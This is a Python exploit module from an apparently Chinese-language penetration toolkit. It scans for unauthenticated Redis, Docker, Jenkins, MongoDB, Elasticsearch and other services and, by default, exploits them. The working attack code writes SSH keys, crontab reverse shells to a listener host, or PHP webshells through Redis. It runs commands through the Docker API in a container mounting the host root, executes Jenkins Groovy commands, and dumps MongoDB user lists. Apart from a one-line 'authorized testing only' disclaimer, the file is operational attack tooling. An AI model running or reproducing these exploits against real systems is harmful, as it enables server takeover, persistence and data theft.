#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
unauth.py - 未授权访问检测与利用模块 v2.0
覆盖Redis/MongoDB/Elasticsearch/Jenkins/Zookeeper/Docker/Memcached/Hadoop等常见未授权
v2.0新增: Redis写SSH公钥/计划任务/webshell、Docker API命令执行、Jenkins Groovy RCE等利用能力
⚠️ 仅用于授权安全测试
"""

import os
import sys
import json
import datetime
import socket
import base64
import requests
from urllib.parse import urljoin

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from core.exploit import (
    generate_random_string, generate_php_webshell,
    bash_reverse_shell_base64, redis_write_ssh_key,
    redis_write_crontab, redis_write_webshell
)
from utils import Colors
from core.ratelimit import AdaptiveRateLimiter, RateLimitConfig
from core.session import create_secure_session

TOOL_NAME = "未授权访问检测&利用"
TOOL_ID = "unauth"
TOOL_DESC = "检测+利用Redis/MongoDB/Docker/Jenkins等未授权访问漏洞，支持写SSH公钥/计划任务反弹shell/webshell"
TOOL_CATEGORY = "exploit"
TOOL_PRIORITY = 0

TIMEOUT = 8


class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[*] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
    def vuln(self, msg): print(f"{Colors.RED}[!] 漏洞: {msg}{Colors.RESET}")
    def exploit(self, msg): print(f"{Colors.MAGENTA}[⚡] 利用: {msg}{Colors.RESET}")
    def raw(self, msg): print(msg)


logger = Logger()
found_vulns = []
exploit_results = []
rate_limiter = None
_session = None


def check_environment(proxy_file=None, rate_limit=True, **kwargs):
    global rate_limiter, _session
    if rate_limit:
        config = RateLimitConfig(min_delay=0.2, max_delay=10.0, initial_delay=0.5,
                                 max_threads=5, initial_threads=2)
        rate_limiter = AdaptiveRateLimiter(config)
    _session = create_secure_session(verify_ssl=False, timeout=TIMEOUT, rate_limiter=rate_limiter)


def _try_request(url, method="GET", **kwargs):
    try:
        resp = _session.request(method, url, **kwargs)
        return resp
    except Exception:
        return None


def _redis_send_command(sock, cmd):
    """发送Redis命令"""
    if isinstance(cmd, str):
        cmd = cmd.encode()
    sock.send(cmd + b"\r\n")
    return sock.recv(4096)


def exploit_redis(ip, port, mode="info", **kwargs):
    """Redis未授权利用
    mode: info/writessh/writecron/writewebshell/keys
    """
    result = {"success": False, "mode": mode, "data": ""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, port))
        
        if mode == "info":
            resp = _redis_send_command(s, b"INFO")
            s.close()
            if resp:
                info = {}
                for line in resp.decode('utf-8', errors='ignore').split('\n'):
                    if ':' in line and not line.startswith('#'):
                        k, v = line.split(':', 1)
                        info[k.strip()] = v.strip()
                result["success"] = True
                result["data"] = info
                logger.exploit(f"Redis INFO获取成功，版本: {info.get('redis_version', 'unknown')}")
        
        elif mode == "keys":
            resp = _redis_send_command(s, b"CONFIG GET dir")
            dir_resp = resp.decode('utf-8', errors='ignore') if resp else ""
            resp = _redis_send_command(s, b"DBSIZE")
            dbsize = resp.decode('utf-8', errors='ignore') if resp else ""
            resp = _redis_send_command(s, b"KEYS *")
            keys = resp.decode('utf-8', errors='ignore') if resp else ""
            s.close()
            result["success"] = True
            result["data"] = {"dir": dir_resp, "dbsize": dbsize, "keys_sample": keys[:500]}
            logger.exploit(f"Redis KEYS获取成功，样本: {keys[:200]}")
        
        elif mode == "writessh":
            ssh_pubkey = kwargs.get("ssh_pubkey", "")
            if not ssh_pubkey:
                result["error"] = "需要提供ssh_pubkey参数"
                s.close()
                return result
            payloads = redis_write_ssh_key(ip, port, ssh_pubkey)
            outputs = []
            for p in payloads:
                resp = _redis_send_command(s, p)
                outputs.append((p, resp.decode('utf-8', errors='ignore') if resp else ""))
            s.close()
            result["success"] = True
            result["data"] = outputs
            logger.exploit(f"Redis SSH公钥写入完成，尝试ssh root@{ip}登录")
        
        elif mode == "writecron":
            lhost = kwargs.get("lhost")
            lport = kwargs.get("lport", 4444)
            if not lhost:
                result["error"] = "需要提供lhost参数（监听IP）"
                s.close()
                return result
            payloads = redis_write_crontab(ip, port, lhost, lport)
            outputs = []
            for p in payloads:
                resp = _redis_send_command(s, p)
                outputs.append((p, resp.decode('utf-8', errors='ignore') if resp else ""))
            s.close()
            result["success"] = True
            result["data"] = outputs
            logger.exploit(f"Redis计划任务写入完成，请在 {lhost}:{lport} 监听反弹shell")
        
        elif mode == "writewebshell":
            web_path = kwargs.get("web_path", "/var/www/html/")
            password = kwargs.get("password", "bee")
            filename = generate_random_string() + ".php"
            payloads = redis_write_webshell(ip, port, web_path, password)
            outputs = []
            for p in payloads:
                resp = _redis_send_command(s, p)
                outputs.append((p, resp.decode('utf-8', errors='ignore') if resp else ""))
            s.close()
            shell_url = f"http://{ip}/{filename}"
            result["success"] = True
            result["data"] = {"outputs": outputs, "shell_path": os.path.join(web_path, filename), "shell_url": shell_url, "password": password}
            logger.exploit(f"Redis webshell写入完成: {shell_url} 密码: {password}")
        
        return result
    except Exception as e:
        result["error"] = str(e)
        logger.error(f"Redis利用失败: {e}")
        return result


def check_redis_unauth(ip, port, exploit=True):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, port))
        s.send(b"INFO\r\n")
        response = s.recv(2048)
        s.close()
        if response and (b"redis_version" in response or b"redis_mode" in response):
            vuln = {
                "vuln": "redis_unauth",
                "severity": "Critical",
                "desc": "Redis未授权访问，可写SSH公钥/计划任务/webshell获取服务器权限",
                "target": f"{ip}:{port}",
                "exploit_available": True
            }
            if exploit:
                info_result = exploit_redis(ip, port, "info")
                if info_result["success"]:
                    vuln["redis_info"] = info_result["data"]
                    vuln["exploit_methods"] = ["writessh(写SSH公钥)", "writecron(计划任务反弹shell)", "writewebshell(写webshell)"]
            return True, vuln
    except Exception:
        pass
    return False, None


def check_mongodb_unauth(ip, port, exploit=True):
    try:
        from pymongo import MongoClient
        client = MongoClient(f"mongodb://{ip}:{port}/", serverSelectionTimeoutMS=TIMEOUT*1000)
        db_list = client.list_database_names()
        vuln = {
            "vuln": "mongodb_unauth",
            "severity": "High",
            "desc": f"MongoDB未授权访问",
            "target": f"{ip}:{port}",
            "databases": db_list,
            "exploit_available": True
        }
        if exploit and "admin" in db_list:
            try:
                admin_db = client["admin"]
                users = list(admin_db.command("usersInfo")["users"])
                vuln["admin_users"] = [{"user": u["user"], "roles": [r["role"] for r in u.get("roles", [])]} for u in users[:10]]
                logger.exploit(f"MongoDB获取到 {len(users)} 个用户")
            except Exception:
                pass
        client.close()
        return True, vuln
    except ImportError:
        return False, "pymongo未安装，跳过MongoDB"
    except Exception:
        pass
    return False, None


def exploit_docker_rce(ip, port, cmd="id"):
    """Docker API未授权命令执行 - 通过创建容器挂载宿主机根目录"""
    result = {"success": False, "output": ""}
    try:
        container_name = f"bee_{generate_random_string()}"
        payload = {
            "Image": "alpine:latest",
            "Cmd": ["sh", "-c", cmd],
            "HostConfig": {
                "Binds": ["/:/mnt"]
            },
            "AttachStdout": True,
            "AttachStderr": True
        }
        url = f"http://{ip}:{port}/containers/create?name={container_name}"
        resp = _try_request(url, method="POST", json=payload)
        if not resp or resp.status_code != 201:
            url = f"http://{ip}:{port}/containers/create?fromImage=alpine:latest&cmd=sh&cmd=-c&cmd={cmd}"
            resp = _try_request(url, method="POST")
            if not resp or resp.status_code not in [200, 201]:
                result["error"] = "创建容器失败"
                return result
        container_id = resp.json().get("Id", "")[:12]
        _try_request(f"http://{ip}:{port}/containers/{container_name}/start", method="POST")
        import time
        time.sleep(2)
        resp = _try_request(f"http://{ip}:{port}/containers/{container_name}/logs?stdout=1&stderr=1")
        if resp:
            result["output"] = resp.text[:1000]
        _try_request(f"http://{ip}:{port}/containers/{container_name}?force=1", method="DELETE")
        result["success"] = True
        logger.exploit(f"Docker RCE执行成功，输出: {result['output'][:200]}")
        return result
    except Exception as e:
        result["error"] = str(e)
        return result


def check_docker_unauth(ip, port, exploit=True):
    url = f"http://{ip}:{port}/containers/json"
    resp = _try_request(url)
    if resp and resp.status_code == 200:
        try:
            containers = resp.json()
            vuln = {
                "vuln": "docker_unauth",
                "severity": "Critical",
                "desc": "Docker Remote API未授权访问，可通过创建容器挂载宿主机根目录RCE",
                "target": f"{ip}:{port}",
                "containers": len(containers),
                "exploit_available": True
            }
            if exploit:
                rce = exploit_docker_rce(ip, port, "id")
                if rce["success"]:
                    vuln["rce_result"] = rce["output"]
                    vuln["exploit_methods"] = ["通过创建alpine容器执行任意命令，挂载宿主机根目录到/mnt"]
            return True, vuln
        except Exception:
            pass
    url = f"http://{ip}:{port}/version"
    resp = _try_request(url)
    if resp and resp.status_code == 200 and "ApiVersion" in resp.text:
        return True, {
            "vuln": "docker_unauth",
            "severity": "Critical",
            "desc": "Docker Remote API未授权访问(RCE风险)",
            "target": f"{ip}:{port}",
            "exploit_available": True
        }
    return False, None


def exploit_jenkins_groovy(ip, port, cmd="id"):
    """Jenkins Groovy脚本控制台RCE"""
    result = {"success": False, "output": ""}
    try:
        for scheme in ["http", "https"]:
            url = f"{scheme}://{ip}:{port}/script"
            sess = requests.Session()
            sess.verify = False
            try:
                resp = sess.get(url, timeout=TIMEOUT)
                if resp.status_code != 200 or "Script Console" not in resp.text:
                    continue
                payload = f'println "{cmd}".execute().text'
                data = {
                    "script": payload,
                    "Submit": "Run"
                }
                resp = sess.post(url, data=data, timeout=TIMEOUT)
                if resp.status_code == 200:
                    import re
                    m = re.search(r'<pre>(.*?)</pre>', resp.text, re.S)
                    if m:
                        result["output"] = m.group(1).strip()[:1000]
                        result["success"] = True
                        logger.exploit(f"Jenkins Groovy RCE执行成功: {result['output'][:200]}")
                    return result
            except Exception:
                continue
        return result
    except Exception as e:
        result["error"] = str(e)
        return result


def check_jenkins_unauth(ip, port, exploit=True):
    for scheme in ["http", "https"]:
        url = f"{scheme}://{ip}:{port}/script"
        resp = _try_request(url)
        if resp and resp.status_code == 200 and "Script Console" in resp.text:
            vuln = {
                "vuln": "jenkins_groovy_rce",
                "severity": "Critical",
                "desc": "Jenkins脚本控制台未授权访问，可执行任意Groovy代码RCE",
                "target": f"{ip}:{port}",
                "exploit_available": True
            }
            if exploit:
                rce = exploit_jenkins_groovy(ip, port, "id")
                if rce["success"]:
                    vuln["rce_result"] = rce["output"]
            return True, vuln
        url = f"{scheme}://{ip}:{port}/"
        resp = _try_request(url)
        if resp and resp.status_code == 200 and "X-Jenkins" in resp.headers:
            return True, {
                "vuln": "jenkins_unauth",
                "severity": "High",
                "desc": f"Jenkins未授权访问, 版本: {resp.headers.get('X-Jenkins', 'unknown')}",
                "target": f"{ip}:{port}",
                "exploit_available": False
            }
    return False, None


def check_elasticsearch_unauth(ip, port, exploit=True):
    for scheme in ["http", "https"]:
        url = f"{scheme}://{ip}:{port}/"
        resp = _try_request(url)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if "version" in data and "cluster_name" in data:
                    vuln = {
                        "vuln": "elasticsearch_unauth",
                        "severity": "High",
                        "desc": f"Elasticsearch未授权访问, 版本: {data['version'].get('number', 'unknown')}",
                        "target": f"{ip}:{port}",
                        "cluster_name": data.get("cluster_name"),
                        "exploit_available": True,
                        "exploit_methods": ["索引数据读写", "CVE-2014-3120/2015-1427 RCE"]
                    }
                    if exploit:
                        try:
                            idx_resp = _try_request(f"{scheme}://{ip}:{port}/_cat/indices?v")
                            if idx_resp:
                                vuln["indices_sample"] = idx_resp.text[:500]
                        except Exception:
                            pass
                    return True, vuln
            except Exception:
                if "lucene" in resp.text.lower() or "elasticsearch" in resp.text.lower():
                    return True, {
                        "vuln": "elasticsearch_unauth",
                        "severity": "High",
                        "desc": "Elasticsearch未授权访问",
                        "target": f"{ip}:{port}"
                    }
    return False, None


def check_zookeeper_unauth(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, port))
        s.send(b"envi\r\n")
        response = s.recv(4096)
        s.close()
        if response and (b"zookeeper.version" in response or b"Environment" in response):
            return True, {
                "vuln": "zookeeper_unauth",
                "severity": "Medium",
                "desc": "Zookeeper未授权访问，可收集集群信息",
                "target": f"{ip}:{port}"
            }
    except Exception:
        pass
    return False, None


def check_memcached_unauth(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, port))
        s.send(b"version\r\n")
        response = s.recv(1024)
        s.close()
        if response and b"VERSION" in response:
            return True, {
                "vuln": "memcached_unauth",
                "severity": "Medium",
                "desc": f"Memcached未授权访问, {response.decode('ascii', errors='ignore').strip()}",
                "target": f"{ip}:{port}"
            }
    except Exception:
        pass
    return False, None


def check_hadoop_yarn_unauth(ip, port):
    for scheme in ["http", "https"]:
        url = f"{scheme}://{ip}:{port}/cluster"
        resp = _try_request(url)
        if resp and resp.status_code == 200 and ("hadoop" in resp.text.lower() or "yarn" in resp.text.lower()):
            return True, {
                "vuln": "hadoop_yarn_unauth",
                "severity": "Critical",
                "desc": "Hadoop YARN ResourceManager未授权访问，可通过提交新应用执行任意命令RCE",
                "target": f"{ip}:{port}",
                "exploit_available": True,
                "exploit_methods": ["通过Application Submission API提交恶意任务执行命令"]
            }
        url = f"{scheme}://{ip}:{port}/ws/v1/cluster/info"
        resp = _try_request(url)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if "clusterInfo" in data:
                    return True, {
                        "vuln": "hadoop_yarn_unauth",
                        "severity": "Critical",
                        "desc": "Hadoop YARN未授权访问(RCE风险)",
                        "target": f"{ip}:{port}"
                    }
            except Exception:
                pass
    return False, None


def check_couchdb_unauth(ip, port):
    for scheme in ["http", "https"]:
        url = f"{scheme}://{ip}:{port}/_all_dbs"
        resp = _try_request(url)
        if resp and resp.status_code == 200:
            try:
                dbs = resp.json()
                if isinstance(dbs, list):
                    return True, {
                        "vuln": "couchdb_unauth",
                        "severity": "High",
                        "desc": f"CouchDB未授权访问, 数据库: {', '.join(dbs[:5])}",
                        "target": f"{ip}:{port}",
                        "exploit_available": True,
                        "exploit_methods": ["CVE-2017-12635/2017-12636 垂直越权+RCE"]
                    }
            except Exception:
                pass
    return False, None


def check_ftp_anonymous(ip, port=21):
    from ftplib import FTP
    try:
        ftp = FTP()
        ftp.connect(ip, port, timeout=TIMEOUT)
        ftp.login("anonymous", "anonymous@")
        files = []
        try:
            files = ftp.nlst()[:20]
        except Exception:
            pass
        ftp.quit()
        return True, {
            "vuln": "ftp_anonymous",
            "severity": "Medium",
            "desc": f"FTP匿名登录可访问，文件数: {len(files)}",
            "target": f"{ip}:{port}",
            "files_sample": files
        }
    except Exception:
        pass
    return False, None


CHECKS = [
    (6379, "redis", check_redis_unauth),
    (27017, "mongodb", check_mongodb_unauth),
    (27018, "mongodb", check_mongodb_unauth),
    (9200, "elasticsearch", check_elasticsearch_unauth),
    (9300, "elasticsearch", check_elasticsearch_unauth),
    (8080, "jenkins/docker", check_jenkins_unauth),
    (2181, "zookeeper", check_zookeeper_unauth),
    (2375, "docker", check_docker_unauth),
    (2376, "docker_tls", check_docker_unauth),
    (11211, "memcached", check_memcached_unauth),
    (8088, "hadoop_yarn", check_hadoop_yarn_unauth),
    (5984, "couchdb", check_couchdb_unauth),
    (21, "ftp_anonymous", check_ftp_anonymous),
]


def scan_target(ip, port, service_name=None, exploit=True):
    port = int(port)
    checkers = []

    for p, svc, func in CHECKS:
        if p == port:
            checkers.append((svc, func))

    if port in [80, 443, 8080, 8081, 8888, 9000]:
        checkers.append(("jenkins", check_jenkins_unauth))

    results = []
    for svc_name, check_func in checkers:
        try:
            vulnerable, data = check_func(ip, port, exploit=exploit)
            if vulnerable:
                if isinstance(data, dict):
                    data["service"] = svc_name
                    data["time"] = datetime.datetime.now().isoformat()
                    results.append(data)
                    logger.vuln(f"{ip}:{port} - {data['desc']}")
                else:
                    logger.warning(data)
        except Exception as e:
            pass

    return results


def execute(scan_result, target_info, config=None, **kwargs):
    global found_vulns, exploit_results
    found_vulns = []
    exploit_results = []

    config = config or {}
    proxy_file = config.get("proxy_file")
    rate_limit = config.get("rate_limit", True)
    do_exploit = config.get("exploit", True)

    check_environment(proxy_file=proxy_file, rate_limit=rate_limit)

    ip = target_info.get("ip", "")
    ports = scan_result.get("ports", [])
    open_ports = []
    for p in ports:
        if p.get("confidence") != "cdn_noise":
            open_ports.append(p)

    logger.info(f"\n{'='*60}")
    logger.info(f"未授权访问检测&利用 v2.0")
    logger.info(f"目标: {ip}")
    logger.info(f"开放端口(过滤CDN噪音): {len(open_ports)} 个")
    logger.info(f"自动利用: {'开启' if do_exploit else '关闭'}")
    logger.info(f"{'='*60}\n")

    for port_info in open_ports:
        port = port_info.get("port")
        service = port_info.get("service", "")
        try:
            vulns = scan_target(ip, port, service, exploit=do_exploit)
            found_vulns.extend(vulns)
        except Exception as e:
            logger.error(f"检测 {ip}:{port} 出错: {e}")

    critical = sum(1 for v in found_vulns if v.get("severity") == "Critical")
    high = sum(1 for v in found_vulns if v.get("severity") == "High")

    logger.info(f"\n{'='*60}")
    logger.info(f"检测完成! 发现漏洞: {len(found_vulns)} 个 (Critical:{critical}, High:{high})")
    if critical > 0:
        logger.warning(f"发现 {critical} 个严重漏洞，可直接获取服务器权限！")
    logger.info(f"{'='*60}\n")

    results_dir = os.path.join(os.path.dirname(__file__), '..', 'data', 'results', TOOL_ID)
    os.makedirs(results_dir, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ip = ip.replace(':', '_').replace('/', '_')
    result_file = os.path.join(results_dir, f"result_{safe_ip}_{ts}.json")
    with open(result_file, 'w', encoding='utf-8') as f:
        json.dump({
            "tool": TOOL_ID,
            "target": ip,
            "summary": f"发现 {len(found_vulns)} 个未授权漏洞 (Critical:{critical}, High:{high})",
            "findings": found_vulns,
            "scan_time": datetime.datetime.now().isoformat()
        }, f, ensure_ascii=False, indent=2)

    return {
        "tool": TOOL_ID,
        "target": ip,
        "time": datetime.datetime.now().isoformat(),
        "status": "success",
        "summary": f"未授权检测完成: {len(found_vulns)}个漏洞 (Critical:{critical}/High:{high})",
        "findings": found_vulns,
        "vulns": found_vulns,
        "critical_count": critical,
        "high_count": high,
        "result_file": result_file,
        "errors": []
    }


if __name__ == "__main__":
    test = {"ports": [{"port": 6379, "service": "redis", "confidence": "high"}, {"port": 2375, "service": "docker", "confidence": "high"}]}
    info = {"ip": "127.0.0.1"}
    print(json.dumps(execute(test, info, {"exploit": False, "rate_limit": False}), ensure_ascii=False, indent=2))
